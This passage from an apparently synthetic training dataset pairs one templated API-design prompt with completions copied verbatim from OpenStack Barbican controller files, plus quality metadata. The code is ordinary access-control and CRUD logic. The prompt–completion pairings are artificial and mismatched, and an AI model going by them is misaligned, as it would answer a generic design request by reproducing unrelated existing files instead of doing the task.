data[operation].get('users', [])\n            if operation in existing_acls_map:  # update if matching acl exists\n                c_acl = existing_acls_map.pop(operation)\n                c_acl.project_access = project_access\n            else:\n                c_acl = models.ContainerACL(self.container.id,\n                                            operation=operation,\n                                            project_access=project_access)\n            self.acl_repo.create_or_replace_from(self.container,\n                                                 container_acl=c_acl,\n                                                 user_ids=user_ids)\n        # delete remaining existing acls as they are not present in input.\n        for acl in existing_acls_map.values():\n            self.acl_repo.delete_entity_by_id(entity_id=acl.id,\n                                              external_project_id=None)\n        acl_ref = '{0}/acl'.format(\n            hrefs.convert_container_to_href(self.container.id))\n        return {'acl_ref': acl_ref}\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('ContainerACL(s) deletion'))\n    @controllers.enforce_rbac('container_acls:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        count = self.acl_repo.get_count(self.container_id)\n        if count > 0:\n            self.acl_repo.delete_acls_for_container(self.container)\n\n    def _return_acl_list_response(self, container_id):\n        result = self.acl_repo.get_by_container_id(container_id)\n\n        acls_data = {}\n        if result:\n            for acl in result:\n                _convert_acl_to_response_format(acl, acls_data)\n        if not acls_data:\n            acls_data = DEFAULT_ACL.copy()\n        return acls_data\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/acls.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.65, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 376}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import exception\nfrom barbican.common import hrefs\nfrom barbican.common import quota\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\nfrom barbican.plugin import util as putil\n\nLOG = utils.getLogger(__name__)\n\n\ndef _consumer_not_found():\n    \"\"\"Throw exception indicating consumer not found.\"\"\"\n    pecan.abort(404, u._('Consumer not found.'))\n\n\ndef _consumer_ownership_mismatch():\n    \"\"\"Throw exception indicating the user does not own this consumer.\"\"\"\n    pecan.abort(403, u._('Not Allowed. Sorry, only the creator of a consumer '\n                         'can delete it.'))\n\n\ndef _invalid_consumer_id():\n    \"\"\"Throw exception indicating consumer id is invalid.\"\"\"\n    pecan.abort(404, u._('Not Found. Provided consumer id is invalid.'))\n\n\nclass ContainerConsumerController(controllers.ACLMixin):\n    \"\"\"Handles Container Consumer entity retrieval and deletion requests\"\"\"\n\n    def __init__(self, container, consumer_id):\n        super().__init__()\n        self.container = container\n        self.consumer_id = consumer_id\n        self.consumer_repo = repo.get_container_consumer_repository()\n        self.validator = validators.ContainerConsumerValidator()\n\n    @pecan.expose(generic=True)\n    def index(self):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('ContainerConsumer retrieval'))\n    @controllers.enforce_rbac('consumer:get')\n    def on_get(self, external_project_id):\n        consumer = self.consumer_repo.get(\n            entity_id=self.consumer_id,\n            suppress_exception=True)\n        if not consumer:\n            _consumer_not_found()\n\n        dict_fields = consumer.to_dict_fields()\n\n        LOG.info('Retrieved a consumer for project: %s',\n                 external_project_id)\n\n        return hrefs.convert_to_hrefs(\n            hrefs.convert_to_hrefs(dict_fields)\n        )\n\n\nclass ContainerConsumersController(controllers.ACLMixin):\n    \"\"\"Handles Container Consumer creation requests\"\"\"\n\n    def __init__(self, container):\n        super().__init__()\n        self.container = container\n        self.container_id = self.container.id\n        self.consumer_repo = repo.get_container_consumer_repository()\n        self.container_repo = repo.get_container_repository()\n        self.project_repo = repo.get_project_repository()\n        self.validator = validators.ContainerConsumerValidator()\n        self.quota_enforcer = quota.QuotaEnforcer('consumers',\n                                                  self.consumer_repo)\n\n    @pecan.expose()\n    def _lookup(self, consumer_id, *remainder):\n        if not utils.validate_id_is_uuid(consumer_id):\n            _invalid_consumer_id()()\n        return ContainerConsumerController(self.container, consumer_id), \\\n            remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('ContainerConsumers(s) retrieval'))\n    @controllers.enforce_rbac('container_consumers:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start consumers on_get '\n                  'for container-ID %s:', self.container_id)\n        result = self.consumer_repo.get_by_container_id(\n            self.container_id,\n            offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit'),\n            suppress_exception=True\n        )\n\n        consumers, offset, limit, total = result\n\n        if not consumers:\n            resp_ctrs_overall = {'consumers': [], 'total': total}\n        else:\n            resp_ctrs = [\n                hrefs.convert_to_hrefs(c.to_dict_fields())\n                for c in consumers\n            ]\n            consumer_path = \"containers/{container_id}/consumers\".format(\n                container_id=self.container_id)\n\n            resp_ctrs_overall = hrefs.add_nav_hrefs(\n                consumer_path,\n                offset,\n                limit,\n                total,\n                {'consumers': resp_ctrs}\n            )\n            resp_ctrs_overall.update({'total': total})\n\n        LOG.info('Retrieved a container consumer list for project: %s',\n                 external_project_id)\n        return resp_ctrs_overall\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('ContainerConsumer creation'))\n    @controllers.enforce_rbac('container_consumers:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n\n        project = res.get_or_create_project(external_project_id)\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_post...%s', data)\n\n        self.quota_enforcer.enforce(project)\n\n        new_consumer = models.ContainerConsumerMetadatum(self.container_id,\n                                                         project.id,\n                                                         data)\n        self.consumer_repo.create_or_update_from(new_consumer, self.container)\n\n        url = hrefs.convert_consumer_to_href(new_consumer.container_id)\n        pecan.response.headers['Location'] = url\n\n        LOG.info('Created a container consumer for project: %s',\n                 external_project_id)\n\n        return self._return_container_data()\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('ContainerConsumer deletion'))\n    @controllers.enforce_rbac('container_consumers:delete')\n    @controllers.enforce_content_types(['application/json'])\n    def on_delete(self, external_project_id, **kwargs):\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_delete...%s', data)\n        project = res.get_or_create_project(external_project_id)\n\n        consumer = self.consumer_repo.get_by_values(\n            self.container_id,\n            data[\"name\"],\n            data[\"URL\"],\n            suppress_exception=True\n        )\n        if not consumer:\n            _consumer_not_found()\n        LOG.debug(\"Found container consumer: %s\", consumer)\n\n        owner_of_consumer = consumer.project_id == project.id\n        owner_of_container = self.container.project.external_id \\\n            == external_project_id\n        if not owner_of_consumer and not owner_of_container:\n            _consumer_ownership_mismatch()\n\n        try:\n            self.consumer_repo.delete_entity_by_id(consumer.id,\n                                                   external_project_id)\n        except exception.NotFound:\n            LOG.exception('Problem deleting container consumer')\n            _consumer_not_found()\n\n        ret_data = self._return_container_data()\n        LOG.info('Deleted a container consumer for project: %s',\n                 external_project_id)\n        return ret_data\n\n    def _return_container_data(self):\n        dict_fields = self.container.to_dict_fields()\n\n        for secret_ref in dict_fields['secret_refs']:\n            hrefs.convert_to_hrefs(secret_ref)\n\n        # TODO(john-wood-w) Why two calls to convert_to_hrefs()?\n        return hrefs.convert_to_hrefs(\n            hrefs.convert_to_hrefs(dict_fields)\n        )\n\n\nclass SecretConsumerController(controllers.ACLMixin):\n    \"\"\"Handles Secret Consumer entity retrieval and deletion requests\"\"\"\n\n    def __init__(self, secret, consumer_id):\n        super().__init__()\n        self.secret = secret\n        self.consumer_id = consumer_id\n        self.consumer_repo = repo.get_secret_consumer_repository()\n        self.validator = validators.SecretConsumerValidator()\n\n    @pecan.expose(generic=True)\n    def index(self):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('SecretConsumer retrieval'))\n    @controllers.enforce_rbac('consumer:get')\n    def on_get(self, external_project_id):\n        consumer = self.consumer_repo.get(\n            entity_id=self.consumer_id,\n            suppress_exception=True)\n        if not consumer:\n            _consumer_not_found()\n\n        dict_fields = consumer.to_dict_fields()\n\n        LOG.info('Retrieved a secret consumer for project: %s',\n                 external_project_id)\n\n        return hrefs.convert_to_hrefs(\n            hrefs.convert_to_hrefs(dict_fields)\n        )\n\n\nclass SecretConsumersController(controllers.ACLMixin):\n    \"\"\"Handles Secret Consumer creation requests\"\"\"\n\n    def __init__(self, secret):\n        super().__init__()\n        self.secret = secret\n        self.secret_id = secret.id\n        self.consumer_repo = repo.get_secret_consumer_repository()\n        self.secret_repo = repo.get_secret_repository()\n        self.project_repo = repo.get_project_repository()\n        self.validator = validators.SecretConsumerValidator()\n        self.quota_enforcer = quota.QuotaEnforcer('consumers',\n                                                  self.consumer_repo)\n\n    @pecan.expose()\n    def _lookup(self, consumer_id, *remainder):\n        if not utils.validate_id_is_uuid(consumer_id):\n            _invalid_consumer_id()()\n        return SecretConsumerController(self.secret, consumer_id), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('SecretConsumers(s) retrieval'))\n    @controllers.enforce_rbac('secret_consumers:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start consumers on_get '\n                  'for secret-ID %s:', self.secret_id)\n        result = self.consumer_repo.get_by_secret_id(\n            self.secret_id,\n            offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit'),\n            suppress_exception=True\n        )\n\n        consumers, offset, limit, total = result\n\n        if not consumers:\n            resp_ctrs_overall = {'consumers': [], 'total': total}\n        else:\n            resp_ctrs = [\n                hrefs.convert_to_hrefs(c.to_dict_fields())\n                for c in consumers\n            ]\n            consumer_path = \"secrets/{secret_id}/consumers\".format(\n                secret_id=self.secret_id)\n\n            resp_ctrs_overall = hrefs.add_nav_hrefs(\n                consumer_path,\n                offset,\n                limit,\n                total,\n                {'consumers': resp_ctrs}\n            )\n            resp_ctrs_overall.update({'total': total})\n\n        LOG.info('Retrieved a consumer list for project: %s',\n                 external_project_id)\n        return resp_ctrs_overall\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('SecretConsumer creation'))\n    @controllers.enforce_rbac('secret_consumers:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n\n        project = res.get_or_create_project(external_project_id)\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_post...%s', data)\n\n        self.quota_enforcer.enforce(project)\n\n        new_consumer = models.SecretConsumerMetadatum(\n            self.secret_id,\n            project.id,\n            data[\"service\"],\n            data[\"resource_type\"],\n            data[\"resource_id\"],\n        )\n        self.consumer_repo.create_or_update_from(new_consumer, self.secret)\n\n        url = hrefs.convert_consumer_to_href(new_consumer.secret_id)\n        pecan.response.headers['Location'] = url\n\n        LOG.info('Created a consumer for project: %s',\n                 external_project_id)\n\n        return self._return_secret_data(self.secret_id)\n\n    @index.when(method='DELETE', template='json')\n    @controllers.handle_exceptions(u._('SecretConsumer deletion'))\n    @controllers.enforce_rbac('secret_consumers:delete')\n    @controllers.enforce_content_types(['application/json'])\n    def on_delete(self, external_project_id, **kwargs):\n        data = api.load_body(pecan.request, validator=self.validator)\n        LOG.debug('Start on_delete...%s', data)\n        project = self.project_repo.find_by_external_project_id(\n            external_project_id, suppress_exception=True)\n        if not project:\n            _consumer_not_found()\n\n        consumer = self.consumer_repo.get_by_values(\n            self.secret_id,\n            data[\"service\"],\n            data[\"resource_type\"],\n            data[\"resource_id\"],\n            suppress_exception=True\n        )\n        if not consumer:\n            _consumer_not_found()\n        LOG.debug(\"Found consumer: %s\", consumer)\n\n        owner_of_consumer = consumer.project_id == project.id\n        owner_of_secret = self.secret.project.external_id \\\n            == external_project_id\n        if not owner_of_consumer and not owner_of_secret:\n            _consumer_ownership_mismatch()\n\n        try:\n            self.consumer_repo.delete_entity_by_id(consumer.id,\n                                                   external_project_id)\n        except exception.NotFound:\n            LOG.exception('Problem deleting consumer')\n            _consumer_not_found()\n\n        ret_data = self._return_secret_data(self.secret_id)\n        LOG.info('Deleted a secret consumer for project: %s',\n                 external_project_id)\n        return ret_data\n\n    def _get_secret(self, secret_id):\n        secret = self.secret_repo.get_secret_by_id(\n            secret_id, suppress_exception=True)\n        if not secret:\n            controllers.secrets.secret_not_found()\n        return secret\n\n    def _return_secret_data(self, secret_id):\n        secret = self._get_secret(secret_id)\n\n        secret_fields = putil.mime_types.augment_fields_with_content_types(\n            secret)\n\n        return hrefs.convert_to_hrefs(secret_fields)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/consumers.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 398}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.api.controllers import acls\nfrom barbican.api.controllers import consumers\nfrom barbican.common import exception\nfrom barbican.common import hrefs\nfrom barbican.common import quota\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\n\nLOG = utils.getLogger(__name__)\n\nCONTAINER_GET = 'container:get'\n\n\ndef container_not_found():\n    \"\"\"Throw exception indicating container not found.\"\"\"\n    pecan.abort(404, u._('Secrets container not found.'))\n\n\ndef invalid_container_id():\n    \"\"\"Throw exception indicating container id is invalid.\"\"\"\n    pecan.abort(404, u._('Not Found. Provided container id is invalid.'))\n\n\nclass ContainerController(controllers.ACLMixin):\n    \"\"\"Handles Container entity retrieval and deletion requests.\"\"\"\n\n    def __init__(self, container):\n        super().__init__()\n        self.container = container\n        self.container_id = container.id\n        self.consumer_repo = repo.get_container_consumer_repository()\n        self.container_repo = repo.get_container_repository()\n        self.validator = validators.ContainerValidator()\n        self.consumers = consumers.ContainerConsumersController(\n            self.container)\n        self.acl = acls.ContainerACLsController(self.container)\n\n    @pecan.expose(generic=True, template='json')\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Container retrieval'))\n    @controllers.enforce_rbac(CONTAINER_GET)\n    def on_get(self, external_project_id):\n        dict_fields = self.container.to_dict_fields()\n\n        for secret_ref in dict_fields['secret_refs']:\n            hrefs.convert_to_hrefs(secret_ref)\n\n        LOG.info('Retrieved container for project: %s',\n                 external_project_id)\n        return hrefs.convert_to_hrefs(\n            hrefs.convert_to_hrefs(dict_fields)\n        )\n\n    @index.when(method='DELETE')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Container deletion'))\n    @controllers.enforce_rbac('container:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        container_consumers = self.consumer_repo.get_by_container_id(\n            self.container_id,\n            suppress_exception=True\n        )\n        try:\n            self.container_repo.delete_entity_by_id(\n                entity_id=self.container_id,\n                external_project_id=external_project_id\n            )\n        except exception.NotFound:\n            LOG.exception('Problem deleting container')\n            container_not_found()\n\n        LOG.info('Deleted container for project: %s',\n                 external_project_id)\n\n        for consumer in container_consumers[0]:\n            try:\n                self.consumer_repo.delete_entity_by_id(\n                    consumer.id, external_project_id)\n            except exception.NotFound:  # nosec\n                pass\n\n\nclass ContainersController(controllers.ACLMixin):\n    \"\"\"Handles Container creation requests.\"\"\"\n\n    def __init__(self):\n        super().__init__()\n        self.consumer_repo = repo.get_container_consumer_repository()\n        self.container_repo = repo.get_container_repository()\n        self.secret_repo = repo.get_secret_repository()\n        self.validator = validators.ContainerValidator()\n        self.quota_enforcer = quota.QuotaEnforcer('containers',\n                                                  self.container_repo)\n\n    @pecan.expose()\n    def _lookup(self, container_id, *remainder):\n        if not utils.validate_id_is_uuid(container_id):\n            invalid_container_id()\n        container = self.container_repo.get_container_by_id(\n            entity_id=container_id, suppress_exception=True)\n        if not container:\n            container_not_found()\n\n        if len(remainder) > 0 and remainder[0] == 'secrets':\n            return ContainersSecretsController(container), ()\n\n        return ContainerController(container), remainder\n\n    @pecan.expose(generic=True, template='json')\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Containers(s) retrieval'))\n    @controllers.enforce_rbac('containers:get')\n    def on_get(self, project_id, **kw):\n        LOG.debug('Start containers on_get for project-ID %s:', project_id)\n\n        result = self.container_repo.get_by_create_date(\n            project_id,\n            offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit', None),\n            name_arg=kw.get('name', None),\n            type_arg=kw.get('type', None),\n            suppress_exception=True\n        )\n\n        containers, offset, limit, total = result\n\n        if not containers:\n            resp_ctrs_overall = {'containers': [], 'total': total}\n        else:\n            resp_ctrs = [\n                hrefs.convert_to_hrefs(c.to_dict_fields())\n                for c in containers\n            ]\n\n            for ctr in resp_ctrs:\n                for secret_ref in ctr.get('secret_refs', []):\n                    hrefs.convert_to_hrefs(secret_ref)\n\n            resp_ctrs_overall = hrefs.add_nav_hrefs(\n                'containers',\n                offset,\n                limit,\n                total,\n                {'containers': resp_ctrs}\n            )\n            resp_ctrs_overall.update({'total': total})\n\n        LOG.info('Retrieved container list for project: %s', project_id)\n        return resp_ctrs_overall\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Container creation'))\n    @controllers.enforce_rbac('containers:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n\n        project = res.get_or_create_project(external_project_id)\n\n        data = api.load_body(pecan.request, validator=self.validator)\n        ctxt = controllers._get_barbican_context(pecan.request)\n        if ctxt:  # in authenticated pipleline case, always use auth token user\n            data['creator_id'] = ctxt.user_id\n\n        self.quota_enforcer.enforce(project)\n\n        LOG.debug('Start on_post...%s', data)\n\n        new_container = models.Container(data)\n        new_container.project_id = project.id\n\n        # TODO(hgedikli): performance optimizations\n        for secret_ref in new_container.container_secrets:\n            secret = self.secret_repo.get(\n                entity_id=secret_ref.secret_id,\n                external_project_id=external_project_id,\n                suppress_exception=True)\n            if not secret:\n                # This only partially localizes the error message and\n                # doesn't localize secret_ref.name.\n                pecan.abort(\n                    404,\n                    u._(\"Secret provided for '{secret_name}' doesn't \"\n                        \"exist.\").format(secret_name=secret_ref.name)\n                )\n\n        self.container_repo.create_from(new_container)\n\n        url = hrefs.convert_container_to_href(new_container.id)\n\n        pecan.response.status = 201\n        pecan.response.headers['Location'] = url\n        LOG.info('Created a container for project: %s',\n                 external_project_id)\n\n        return {'container_ref': url}\n\n\nclass ContainersSecretsController(controllers.ACLMixin):\n    \"\"\"Handles ContainerSecret creation and deletion requests.\"\"\"\n\n    def __init__(self, container):\n        LOG.debug('=== Creating ContainerSecretsController ===')\n        super().__init__()\n        self.container = container\n        self.container_secret_repo = repo.get_container_secret_repository()\n        self.secret_repo = repo.get_secret_repository()\n        self.validator = validators.ContainerSecretValidator()\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Container Secret creation'))\n    @controllers.enforce_rbac('container_secret:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n        \"\"\"Handles adding an existing secret to an existing container.\"\"\"\n\n        if self.container.type != 'generic':\n            pecan.abort(400, u._(\"Only 'generic' containers can be modified.\"))\n\n        data = api.load_body(pecan.request, validator=self.validator)\n\n        name = data.get('name')\n        secret_ref = data.get('secret_ref')\n        secret_id = hrefs.get_secret_id_from_ref(secret_ref)\n\n        secret = self.secret_repo.get(\n            entity_id=secret_id,\n            external_project_id=external_project_id,\n            suppress_exception=True)\n        if not secret:\n            pecan.abort(404, u._(\"Secret provided doesn't exist.\"))\n\n        found_container_secrets = list(\n            filter(lambda cs: cs.secret_id == secret_id and cs.name == name,\n                   self.container.container_secrets)\n        )\n\n        if found_container_secrets:\n            pecan.abort(409, u._('Conflict. A secret with that name and ID is '\n                                 'already stored in this container. The same '\n                                 'secret can exist in a container as long as '\n                                 'the name is unique.'))\n\n        LOG.debug('Start container secret on_post...%s', secret_ref)\n        new_container_secret = models.ContainerSecret()\n        new_container_secret.container_id = self.container.id\n        new_container_secret.name = name\n        new_container_secret.secret_id = secret_id\n        self.container_secret_repo.save(new_container_secret)\n\n        url = hrefs.convert_container_to_href(self.container.id)\n        LOG.debug('URI to container is %s', url)\n\n        pecan.response.status = 201\n        pecan.response.headers['Location'] = url\n        LOG.info('Created a container secret for project: %s',\n                 external_project_id)\n\n        return {'container_ref': url}\n\n    @index.when(method='DELETE')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Container Secret deletion'))\n    @controllers.enforce_rbac('container_secret:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        \"\"\"Handles removing a secret reference from an existing container.\"\"\"\n\n        data = api.load_body(pecan.request, validator=self.validator)\n\n        name = data.get('name')\n        secret_ref = data.get('secret_ref')\n        secret_id = hrefs.get_secret_id_from_ref(secret_ref)\n\n        secret = self.secret_repo.get(\n            entity_id=secret_id,\n            external_project_id=external_project_id,\n            suppress_exception=True)\n        if not secret:\n            pecan.abort(404, u._(\"Secret '{secret_name}' with reference \"\n                                 \"'{secret_ref}' doesn't exist.\").format(\n                                     secret_name=name, secret_ref=secret_ref))\n\n        found_container_secrets = list(\n            filter(lambda cs: cs.secret_id == secret_id and cs.name == name,\n                   self.container.container_secrets)\n        )\n\n        if not found_container_secrets:\n            pecan.abort(404, u._('Secret provided is not in the container'))\n\n        for container_secret in found_container_secrets:\n            self.container_secret_repo.delete_entity_by_id(\n                container_secret.id, external_project_id)\n\n        pecan.response.status = 204\n        LOG.info('Deleted container secret for project: %s',\n                 external_project_id)\n", "metadata": {"source": "github.com/openstack/barbican", "file_path": "barbican/api/controllers/containers.py", "language": "python", "complexity": "complex", "star_count": 241, "quality_score": 0.6799999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 327}, "authority_level": "medium", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#  Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License. You may obtain\n#  a copy of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing, software\n#  distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#  WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#  License for the specific language governing permissions and limitations\n#  under the License.\n\nimport pecan\n\nfrom barbican import api\nfrom barbican.api import controllers\nfrom barbican.common import hrefs\nfrom barbican.common import quota\nfrom barbican.common import resources as res\nfrom barbican.common import utils\nfrom barbican.common import validators\nfrom barbican import i18n as u\nfrom barbican.model import models\nfrom barbican.model import repositories as repo\nfrom barbican.queue import client as async_client\n\nLOG = utils.getLogger(__name__)\n\n\ndef _order_not_found():\n    \"\"\"Throw exception indicating order not found.\"\"\"\n    pecan.abort(404, u._('Order not found.'))\n\n\ndef _secret_not_in_order():\n    \"\"\"Throw exception that secret info is not available in the order.\"\"\"\n    pecan.abort(400, u._(\"Secret metadata expected but not received.\"))\n\n\ndef _order_update_not_supported():\n    \"\"\"Throw exception that PUT operation is not supported for orders.\"\"\"\n    pecan.abort(405, u._(\"Order update is not supported.\"))\n\n\ndef _order_cannot_be_updated_if_not_pending(order_status):\n    \"\"\"Throw exception that order cannot be updated if not PENDING.\"\"\"\n    pecan.abort(400, u._(\"Only PENDING orders can be updated. Order is in the\"\n                         \"{0} state.\").format(order_status))\n\n\ndef order_cannot_modify_order_type():\n    \"\"\"Throw exception that order type cannot be modified.\"\"\"\n    pecan.abort(400, u._(\"Cannot modify order type.\"))\n\n\nclass OrderController(controllers.ACLMixin):\n\n    \"\"\"Handles Order retrieval and deletion requests.\"\"\"\n\n    def __init__(self, order, queue_resource=None):\n        super().__init__()\n        self.order = order\n        self.order_repo = repo.get_order_repository()\n        self.queue = queue_resource or async_client.TaskClient()\n        self.type_order_validator = validators.TypeOrderValidator()\n\n    def get_acl_tuple(self, req, **kwargs):\n        acl = dict()\n        acl['project_id'] = self.order.project.external_id\n        acl['creator_id'] = self.order.creator_id\n        return 'order', acl\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Order retrieval'))\n    @controllers.enforce_rbac('order:get')\n    def on_get(self, external_project_id):\n        return hrefs.convert_to_hrefs(self.order.to_dict_fields())\n\n    @index.when(method='DELETE')\n    @utils.allow_all_content_types\n    @controllers.handle_exceptions(u._('Order deletion'))\n    @controllers.enforce_rbac('order:delete')\n    def on_delete(self, external_project_id, **kwargs):\n        self.order_repo.delete_entity_by_id(\n            entity_id=self.order.id,\n            external_project_id=external_project_id)\n\n\nclass OrdersController(controllers.ACLMixin):\n    \"\"\"Handles Order requests for Secret creation.\"\"\"\n\n    def __init__(self, queue_resource=None):\n        LOG.debug('Creating OrdersController')\n        super().__init__()\n        self.order_repo = repo.get_order_repository()\n        self.queue = queue_resource or async_client.TaskClient()\n        self.type_order_validator = validators.TypeOrderValidator()\n        self.quota_enforcer = quota.QuotaEnforcer('orders', self.order_repo)\n\n    @pecan.expose()\n    def _lookup(self, order_id, *remainder):\n        # NOTE(jaosorior): It's worth noting that even though this section\n        # actually does a lookup in the database regardless of the RBAC policy\n        # check, the execution only gets here if authentication of the user was\n        # previously successful.\n\n        ctx = controllers._get_barbican_context(pecan.request)\n\n        order = self.order_repo.get(entity_id=order_id,\n                                    external_project_id=ctx.project_id,\n                                    suppress_exception=True)\n        if not order:\n            _order_not_found()\n\n        return OrderController(order, self.order_repo), remainder\n\n    @pecan.expose(generic=True)\n    def index(self, **kwargs):\n        pecan.abort(405)  # HTTP 405 Method Not Allowed as default\n\n    @index.when(method='GET', template='json')\n    @controllers.handle_exceptions(u._('Order(s) retrieval'))\n    @controllers.enforce_rbac('orders:get')\n    def on_get(self, external_project_id, **kw):\n        LOG.debug('Start orders on_get '\n                  'for project-ID %s:', external_project_id)\n\n        result = self.order_repo.get_by_create_date(\n            external_project_id, offset_arg=kw.get('offset', 0),\n            limit_arg=kw.get('limit', None), meta_arg=kw.get('meta', None),\n            suppress_exception=True)\n        orders, offset, limit, total = result\n\n        if not orders:\n            orders_resp_overall = {'orders': [],\n                                   'total': total}\n        else:\n            orders_resp = [\n                hrefs.convert_to_hrefs(o.to_dict_fields())\n                for o in orders\n            ]\n            orders_resp_overall = hrefs.add_nav_hrefs('orders',\n                                                      offset, limit, total,\n                                                      {'orders': orders_resp})\n            orders_resp_overall.update({'total': total})\n\n        return orders_resp_overall\n\n    @index.when(method='PUT', template='json')\n    @controllers.handle_exceptions(u._('Order update'))\n    @controllers.enforce_rbac('orders:put')\n    def on_put(self, external_project_id, **kwargs):\n        _order_update_not_supported()\n\n    @index.when(method='POST', template='json')\n    @controllers.handle_exceptions(u._('Order creation'))\n    @controllers.enforce_rbac('orders:post')\n    @controllers.enforce_content_types(['application/json'])\n    def on_post(self, external_project_id, **kwargs):\n        project = 